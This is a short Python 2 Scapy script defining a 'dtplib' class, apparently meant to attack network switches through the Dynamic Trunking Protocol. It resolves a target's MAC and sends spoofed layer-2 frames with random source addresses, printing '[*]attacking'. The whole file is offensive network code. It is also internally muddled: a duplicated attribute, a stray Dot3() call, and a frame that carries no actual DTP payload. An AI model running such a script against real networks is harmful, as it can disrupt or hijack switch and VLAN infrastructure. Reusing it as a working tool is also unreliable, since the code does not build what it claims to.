import socket
from scapy.layers.l2 import Dot3
from scapy.contrib.dtp import *
from scapy.all import *
from utils.GetIpMac import *
class dtplib:
	target_ip=''
	target_mac=''
	host_ip=''
	target_mac=''
	def __init__(self,target_ip):
		self.host_arp=get_mac_address()
		self.host_ip=get_ip_address('eth0')
		self.target_ip=target_ip
		self.target_mac=getmacbyip(target_ip)

	def run(self):
		eth=Ether(src=RandMAC("*:*:*:*:*:*"),dst=self.target_mac)
		llc=LLC(dsap=0xaa,ssap=0xaa,ctrl=0x03)
		Dot3()
		packet=eth/llc/Dot3()
		sendp(packet,iface='eth0')
		print "[*]attacking"
